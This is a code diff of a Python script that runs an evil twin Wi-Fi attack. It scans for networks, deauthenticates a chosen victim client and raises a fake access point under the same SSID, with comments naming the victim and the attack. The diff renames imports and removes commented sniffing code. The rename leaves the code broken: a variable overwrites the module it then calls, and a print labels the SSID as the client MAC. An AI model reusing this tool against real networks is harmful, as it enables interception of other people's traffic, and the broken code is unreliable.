@@ -4,9 +4,9 @@ import csv
 import subprocess
 # import scapy.all as scapy
 from scapy.layers.l2 import ARP, Ether
-import WifiAdapter as WAF
-import deautenticate as DA
-import Twin_create as TC
+import WifiAdapter
+import Deauthenticate
+import Twin_create
 from scapy import all as sc
 import time
 from threading import Thread
@@ -102,9 +102,9 @@ def CLientsSniffing(pkt):
 if __name__ == "__main__":
 
     #finding wifi adapter
-    WifiAdapter = WAF.WifiAdapterFinder()
+    WifiAdapter = WifiAdapter.WifiAdapterFinder()
     #changing adapter to monitor mode
-    WAF.MonitorMode(WifiAdapter)
+    WifiAdapter.MonitorMode(WifiAdapter)
     #scanning for wifi network to attack
     wifi_details = WifiNetworksFinder()
     ChosenWifiMA = wifi_details[0]
@@ -118,37 +118,14 @@ if __name__ == "__main__":
     print("chosen wifi ssid is : " , ChosenWifiSSID)
     print("chosen client mac address is : " , ChosenWifiSSID)
     #create thread that disconnect the victim from the chosen wifi 
-    Deauthenticate_thread = Thread(target=DA.deautenticate_user,args=[WifiAdapter,ChosenWifiMA,ChosenClient])
+    Deauthenticate_thread = Thread(target=Deauthenticate.deautenticate_user,args=[WifiAdapter,ChosenWifiMA,ChosenClient])
 
     #create thread that create an fake wireless network (evil twin)
-    TwinNet_thread = Thread(target = TC.create_fake_access_point , args = [WifiAdapter , ChosenWifiMA , ChosenClient , ChosenWifiSSID])
+    TwinNet_thread = Thread(target = Twin_create.create_fake_access_point , args = [WifiAdapter , ChosenWifiMA , ChosenClient , ChosenWifiSSID])
 
     Deauthenticate_thread.start()
     TwinNet_thread.start()
 
     TwinNet_thread.join()
     Deauthenticate_thread.join()
-    # DA.deautenticate_user(WifiAdapter,ChosenWifiMA,chosenClient)
-    # TC.create_fake_access_point(WifiAdapter , ChosenWifiMA , ChosenClient , ChosenWifiSSID)
-    
 
-
-
-
-
-
-# # IFACE = WAF.WifiAdapterFinder()
-# # IFACE_NAME = WAF.MonitorMode(IFACE)
-# iface = "wlan0mon"
-# devices = set()
-# def PacketHandler(pkt):
-#     print("packet found")
-#     if pkt.haslayer(Dot11):
-#         dot11_layer = pkt.getlayer(Dot11)
-#         print("packet has layer dot11")  
-#         if dot11_layer.addr2 and (dot11_layer.addr2 not in devices):
-#             devices.add(dot11_layer.addr2)
-#             print((len(devices) -1 ), dot11_layer.addr2, dot11_layer.payload.name)
-  
-  
-# sniff(iface=iface,prn=PacketHandler)
